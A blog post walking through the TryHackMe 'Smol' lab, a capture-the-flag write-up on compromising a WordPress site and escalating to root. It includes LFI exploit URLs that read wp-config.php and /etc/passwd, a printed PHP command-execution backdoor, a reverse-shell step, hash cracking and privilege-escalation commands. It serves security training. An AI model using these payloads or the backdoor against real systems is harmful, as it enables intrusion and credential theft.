<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>THM: Smol</title>
<meta name=description content="Platform: TryHackMe Link: Smol Level: Medium OS: Linux Read this write up in french
Smol focuses on exploiting vulnerabilities in WordPress plugins. The …"><meta name=keywords content="TryHackMe"><meta property="og:url" content="https://scorpiosec.com/posts/thm-smol/"><meta property="og:type" content="website"><meta property="og:title" content="THM: Smol"><meta property="og:description" content="Platform: TryHackMe Link: Smol Level: Medium OS: Linux Read this write up in french
Smol focuses on exploiting vulnerabilities in WordPress plugins. The …"><meta property="og:image" content="https://scorpiosec.com/images/THM-Smol/Smol.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/THM-Smol/Smol.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="THM: Smol"><meta name=twitter:description content="Platform: TryHackMe Link: Smol Level: Medium OS: Linux Read this write up in french
Smol focuses on exploiting vulnerabilities in WordPress plugins. The …"><meta property="twitter:domain" content="https://scorpiosec.com/posts/thm-smol/"><meta property="twitter:url" content="https://scorpiosec.com/posts/thm-smol/"><meta name=twitter:image content="https://scorpiosec.com/images/THM-Smol/Smol.png"><link rel=canonical href=https://scorpiosec.com/posts/thm-smol/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/posts/ aria-label><span data-feather=book></span> Posts</a></div><div class=nav-link><a href=https://scorpiosec.com/projects/ aria-label><span data-feather=code></span> Projects</a></div><div class=nav-link><a href=https://scorpiosec.com/tags/ aria-label><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/categories/ aria-label><span data-feather=folder></span> Categories</a></div><div class="nav-link language-switcher"><a href=/fr/posts/thm-smol/>Français</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/posts/><span data-feather=book></span> Posts</a></li><li class=nav-item><a href=https://scorpiosec.com/projects/><span data-feather=code></span> Projects</a></li><li class=nav-item><a href=https://scorpiosec.com/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/categories/><span data-feather=folder></span> Categories</a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>THM: Smol</h1><small role=doc-subtitle></small><p class=post-date>5 min read |
<span class=post-date>January 27, 2025</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/tags/tryhackme>TryHackMe</a></li></ul></div><div class=post-content><ul><li>Platform: TryHackMe</li><li>Link: <a href=https://tryhackme.com/r/room/smol>Smol</a></li><li>Level: Medium</li><li>OS: Linux</li></ul><hr><p><a href=https://scorpiosec.com/fr/posts/thm-smol/>Read this write up in french</a></p><p>Smol focuses on exploiting vulnerabilities in WordPress plugins. The challenge begins with enumerating a WordPress site using WPScan, where we discover a plugin vulnerable to Local File Inclusion (LFI). This allows us to extract credentials and log into the WordPress dashboard. Within the dashboard, a private note directs us to the source code of the Hello Dolly plugin, which contains a backdoor. Leveraging this backdoor, we gain an initial foothold. Through a series of privilege escalation techniques, we eventually gain access to a user with unrestricted sudo privileges, granting full root access to the system.</p><h2 id=scanning>Scanning</h2><pre tabindex=0><code>nmap -sC -sV -Pn -oA nmap/Smol 10.10.230.246
</code></pre><p><strong>Results</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2025-01-25 20:59 CST
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> 10.10.230.246
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.20s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#d19a66>998</span> closed tcp ports <span style=color:#56b6c2>(</span>conn-refused<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 <span style=color:#56b6c2>(</span>Ubuntu Linux; protocol 2.0<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#d19a66>3072</span> 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 <span style=color:#56b6c2>(</span>RSA<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|   <span style=color:#d19a66>256</span> 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 <span style=color:#56b6c2>(</span>ECDSA<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#d19a66>256</span> d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb <span style=color:#56b6c2>(</span>ED25519<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>80/tcp open  http    Apache httpd 2.4.41 <span style=color:#56b6c2>((</span>Ubuntu<span style=color:#56b6c2>))</span>
</span></span><span style=display:flex><span>|_http-title: Did not follow redirect to http://www.smol.thm
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.41 <span style=color:#56b6c2>(</span>Ubuntu<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 52.63 seconds
</span></span></code></pre></div><p>With nmap we find two open ports:</p><ul><li>22 running SSH</li><li>80 running http with a redirection to <code>www.smol.thm</code>. We add it to our <code>/etc/hosts</code> file.</li></ul><pre tabindex=0><code>sudo echo &#34;{TARGET_IP} www.smol.thm&#34; | sudo tee -a /etc/hosts
</code></pre><h2 id=enumeration>Enumeration</h2><p>At <code>http://www.smol.thm/</code> we find a blog website.</p><p><img src=/images/THM-Smol/smol_website.png alt="Smol blog website"></p><p>With <code>Wappalyzer</code> we learn that the website uses WordPress.</p><p><img src=/images/THM-Smol/WP_wappalyzer.png alt="Smol Wappalyzer"></p><p>Using Gobuster for directory brute forcing we find a few directories.</p><pre tabindex=0><code>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://www.smol.thm
</code></pre><p>At <code>http://www.smol.thm/wp-includes/</code> we find the <code>/wp-includes/</code> directory containing WordPress core files.</p><blockquote><p>Note that direct browsing to the <code>wp-includes</code> directory should be <strong>disabled</strong>.</p></blockquote><p><img src=/images/THM-Smol/wpincludes_smol.png alt="wp-includes directory"></p><p>At <code>http://www.smol.thm/wp-admin</code> we find a login page.</p><p><img src=/images/THM-Smol/wpadmin_login.png alt="wp-admin login"></p><p>Since we have a Wordpress website, we can use <code>WPScan</code> to enumerate users.</p><pre tabindex=0><code>wpscan --url http://www.smol.thm/ --enumerate u
</code></pre><p><img src=/images/THM-Smol/wpscan_users.png alt="wpscan users"></p><p>We can also enumerate the plugins in use.</p><pre tabindex=0><code>wpscan --url http://www.smol.thm/ --enumerate p
</code></pre><p><img src=/images/THM-Smol/wpscan_plugins.png alt="wpscan plugins"></p><p>WPScan finds two plugins in use:</p><ul><li><code>twentytwentythree</code> which is outdated (version 1.2)</li><li><code>jsmol2wp</code> running with version 1.07 (up to date)</li></ul><p>When we search an exploit for <code>jsmol2wp version 1.07</code> we find <a href=https://pentest-tools.com/vulnerabilities-exploits/wordpress-jsmol2wp-107-local-file-inclusion_2654>CVE-2018-20463</a> with a PoC <a href=https://github.com/sullo/advisory-archives/blob/master/wordpress-jsmol2wp-CVE-2018-20463-CVE-2018-20462.txt>here</a>. The vulnerability allows for arbitrary file read. Using the url below we find some credentials, <code>wpuser:kbLSF2Vop#lw3rjDZ629*Z%G</code>.</p><pre tabindex=0><code>http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&amp;call=getRawDataFromDatabase&amp;query=php://filter/resource=../../../../wp-config.php
</code></pre><p><img src=/images/THM-Smol/creds_leaked.png alt="credentials leaked"></p><p>Using the same LFI vulnerability we also enumerate the users on the system.</p><pre tabindex=0><code>http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&amp;call=getRawDataFromDatabase&amp;query=php://filter/resource=../../../../../../../etc/passwd
</code></pre><p>We identify four users: <code>think</code>, <code>xavi</code>, <code>diego</code>, and <code>gege</code>.</p><p><img src=/images/THM-Smol/system_users.png alt="users on the system"></p><p>The credentials are valid on the WordPress login page giving us access to the Dashboard.</p><p><img src=/images/THM-Smol/wp_dashboard.png alt="WordPress dashboard"></p><p>In the <code>Pages</code> section we find a page (<code>Webmaster Tasks!!</code>) which was not displayed on the blog. We can also access it by going to <code>http://www.smol.thm/index.php/to-do/</code>.</p><p><img src=/images/THM-Smol/todo_page.png alt="todo page"></p><p>The first task mentions a plugin called <code>Hello Dolly</code>, telling us to check its source code. After some research we find that the plugin file (<code>hello.php</code>) is located in <code>wp-content/plugins</code>.</p><p><img src=/images/THM-Smol/hello_dolly.png alt="hello dolly php file"></p><h2 id=initial-foothold>Initial Foothold</h2><p>Once again leveraging our LFI vulnerability we can see the content of the file.</p><pre tabindex=0><code>http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&amp;call=getRawDataFromDatabase&amp;query=php://filter/resource=../../../../wp-content/plugins/hello.php
</code></pre><p><img src=/images/THM-Smol/hello_dolly_code.png alt="hello dolly code"></p><p>We find an eval function and the base64 string decodes to: <code>if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); }</code>. The function <code>hello_dolly()</code> seems to be a backdoor. The plugin is supposed to only show a line of the song <a href="https://www.youtube.com/watch?v=l7N2wssse14&amp;ab_channel=AustinCasey">Hello Dolly</a> on the Dashboard.</p><p><img src=/images/THM-Smol/hello_dolly_lyrics.png alt="hello dolly clyrics"></p><p>But now it also checks if the <code>cmd</code> parameter (<code>\143\155\x64</code> translates to <code>cmd</code>) exists in the query string of the HTTP request (<code>$_GET</code>). If it exists the <code>system</code> function executes the value of the <code>cmd</code> parameter as a system command on the server.</p><p>Example: <code>http://www.smol.thm/wp-admin/index.php?cmd=whoami</code> will execute the <code>whoami</code> command on the server.</p><p><img src=/images/THM-Smol/command_execution.png alt="hello dolly command execution"></p><p>We can use this to get a reverse shell.</p><blockquote><p>I used the reverse shell <code>nc mkfifo</code> from <a href=https://www.revshells.com/>revshells</a> and URL encoded it.</p></blockquote><pre tabindex=0><code>http://www.smol.thm/wp-admin/index.php?cmd=REVSHELL
</code></pre><p><img src=/images/THM-Smol/revshell_cmd.png alt="revshell command"></p><p>On the listener we receive a connection.</p><p><img src=/images/THM-Smol/foothold.png alt=Foothold></p><p>In <code>/opt</code> we find a file called <code>wp_backup.sql</code>.</p><p><img src=/images/THM-Smol/wpbackup.png alt="sql file"></p><h3 id=shell-as-diego>Shell as diego</h3><p>With <code>cat wp_backup.sql | grep "wpuser"</code> we find the hashes of all the users. But we know that only four of them are actual users on the target system.</p><p><img src=/images/THM-Smol/db_data.png alt="Credentials in database"></p><pre tabindex=0><code>think:$P$B0jO/cdGOCZhlAJfPSqV2gVi2pb7Vd/
gege:$P$BsIY1w5krnhP3WvURMts0/M4FwiG0m1
diego:$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1
xavi:$P$BvcalhsCfVILp2SgttADny40mqJZCN/
</code></pre><p>These are WordPress hashes, we can use john to crack the hashes. We succeed in cracking the hash for <code>diego</code>.</p><pre tabindex=0><code>john --format=phpass --wordlist=/usr/share/wordlists/rockyou.txt creds.txt
</code></pre><p><img src=/images/THM-Smol/diego_pwd.png alt="diego pwd"></p><p>With the password we switch to <code>diego</code> and recover the user flag.</p><p><img src=/images/THM-Smol/user_flag.png alt="user flag"></p><p>Because <code>diego</code> is part of the <code>internal</code> group he can access the other users directory.</p><p><img src=/images/THM-Smol/internal_group.png alt="internal group"></p><p>In <code>/home/gege/</code> we find a file called <code>wordpress.old.zip</code> but we cannot interact with it with our current user.</p><p><img src=/images/THM-Smol/wordpress_old.png alt="wordpress_old zip file"></p><h3 id=shell-as-think>Shell as think</h3><p>We can see a <code>.ssh</code> file in the <code>think</code> user home directory.</p><p><img src=/images/THM-Smol/think_ssh.png alt="think user ssh directory"></p><p><img src=/images/THM-Smol/think_ssh_keys.png alt="think ssh keys"></p><p>We send the SSH key to our local kali machine and login as <code>think</code>.</p><p><img src=/images/THM-Smol/think_SSH_login.png alt="think ssh login"></p><h3 id=shell-as-gege>Shell as gege</h3><p>We search for the files with SUID bit set.</p><pre tabindex=0><code>find / -perm -4000 -type f 2&gt;/dev/null
</code></pre><p>We discover the <code>/usr/bin/su</code> has the SUID bit set meaning we can execute the file with the with the permissions of the file&rsquo;s owner (root).</p><p><img src=/images/THM-Smol/SUID_files.png alt="SUID files"></p><p>We are able to switch to <code>gege</code> without being asked for a password form the user <code>think</code>, when using the command <code>su gege</code>.</p><p><img src=/images/THM-Smol/user_gege.png alt="user gege"></p><p>After checking the file <code>/etc/pam.d/su</code> (this file controls how <code>su</code> behaves) we see that there is a rule marking the authentication as sufficient if the current user is <code>think</code>.</p><p><img src=/images/THM-Smol/su_file.png alt="su file"></p><h3 id=shell-as-xavi>Shell as xavi</h3><p>We send <code>wordpress.old.zip</code> to our local kali. But it requires a password. We can use john to attempt to crack the zip password.</p><p>First we generate a suitable hash.</p><pre tabindex=0><code>zip2john wordpress.old.zip &gt; hash.txt
</code></pre><p>Then we crack it with john.</p><pre tabindex=0><code>john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
</code></pre><p><img src=/images/THM-Smol/archive_pwd.png alt="archive password"></p><p>With the password we unzip the archive.</p><p>Inside <code>wp-config.php</code> we find <code>xavi</code> password, with it we switch to that user.</p><p><img src=/images/THM-Smol/xavi_pwd.png alt="xavi password"></p><h2 id=privilege-escalation>Privilege Escalation</h2><p>With <code>sudo -l</code>, we see that <code>xavi</code> has unrestricted sudo privileges allowing us to become root with <code>sudo su</code>.</p><p><img src=/images/THM-Smol/xavi2root.png alt="xavi to root"></p><h3 id=unintended-method-i-think>Unintended Method (I think)</h3><p>From <code>think</code> user shell, we can use <code>/usr/bin/su root</code> to switch to the <code>root</code> user and the password is <code>root</code>.</p><blockquote><p>This also works from <code>www-data</code>, meaning we can get to the <code>root</code> user as soon as you get inside the system.</p></blockquote><blockquote><p>EDIT: As of 01/28/2025, this method has been patched.</p></blockquote><p><img src=/images/THM-Smol/root_flag.png alt="root flag"></p></div><div class=prev-next><div class=prev-post><p><a href=/posts/htb-monitorsthree/>&#8592;
Previous:
HTB: MonitorsThree</a></p><p class=prev-post-date>January 17, 2025</p></div><div class=next-post><p><a href=/posts/htb-trickster/>Next:
HTB: Trickster
&#8594;</a></p><p class=next-post-date>January 31, 2025</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#scanning>Scanning</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#initial-foothold>Initial Foothold</a><ul><li><a href=#shell-as-diego>Shell as diego</a></li><li><a href=#shell-as-think>Shell as think</a></li><li><a href=#shell-as-gege>Shell as gege</a></li><li><a href=#shell-as-xavi>Shell as xavi</a></li></ul></li><li><a href=#privilege-escalation>Privilege Escalation</a><ul><li><a href=#unintended-method-i-think>Unintended Method (I think)</a></li></ul></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2025 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>